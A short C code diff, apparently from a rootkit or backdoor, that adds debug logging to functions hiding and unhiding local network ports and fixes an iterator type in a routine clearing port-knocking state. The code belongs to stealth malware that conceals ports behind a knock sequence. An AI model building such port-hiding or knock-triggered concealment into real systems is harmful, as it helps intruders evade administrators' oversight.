@@ -55,13 +55,16 @@ lport_list_t_ptr hidden_lports_tail = &hidden_lports;
 void
 hide_lport(lport_t lport)
 {
-    if (!list_contains_lport(&hidden_lports, lport))
+    if (!list_contains_lport(&hidden_lports, lport)) {
+        DEBUG_INFO("hiding lport %d\n", lport);
         add_lport_to_list(hidden_lports_tail, lport);
+    }
 }
 
 void
 unhide_lport(lport_t lport)
 {
+    DEBUG_INFO("unhiding lport %d\n", lport);
     remove_lport_from_list(hidden_lports_tail, lport);
 }
 
@@ -86,7 +89,9 @@ stage3_knock(lport_t port)
 void
 clear_hidden_lports(void)
 {
-    lport_list_t_ptr i;
+    DEBUG_INFO("clearing hidden lports\n");
+
+    knock_list_t_ptr i;
 
     i = ips_stage1_tail;
     while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
@@ -97,8 +102,10 @@ clear_hidden_lports(void)
     i = ips_stage3_tail;
     while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
 
-    i = hidden_lports_tail;
-    while ((i = remove_lport_from_list(i, i->lport)));
+    lport_list_t_ptr j;
+
+    j = hidden_lports_tail;
+    while ((j = remove_lport_from_list(j, j->lport)));
 }
 
 bool
